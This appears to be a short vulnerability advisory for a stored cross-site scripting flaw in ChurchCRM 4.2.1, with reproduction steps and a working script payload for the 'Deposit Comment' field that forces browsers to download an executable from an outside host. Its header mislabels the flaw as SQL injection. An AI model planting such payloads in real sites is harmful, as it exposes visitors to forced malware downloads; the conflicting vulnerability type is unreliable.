#ChurchCRM 4.2.1- Persistent Cross Site Scripting(XSS)

##Vendor Homepage: https://churchcrm.io/
##Software Link: https://github.com/ChurchCRM/CRM

## Vulnerability Type :
SQL Injection


## Vulnerability Version :
Version: 4.2.1


## Recurring environment:
* Windows 10
* PHP 5.4.5
* Apache 2.4.23


## Vulnerability Description AND recurrence:

ChurchCRM application allows stored XSS , via 'Add new Deposit' module, that is rendered upon 'View All Deposits' page visit. There are multiple locations where this can be replicated To exploit this vulnerability:
 
   1. Login to the application, go to 'View all Deposits' module.
   2. Add the payload ( <script>var link = document.createElement('a');
   link.href = 'http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe';
   link.download = ''; document.body.appendChild(link); link.click();
</script> ) in the 'Deposit Comment' field and click "Add New Deposit".
   3. Payload is executed and a .exe file is downloaded.
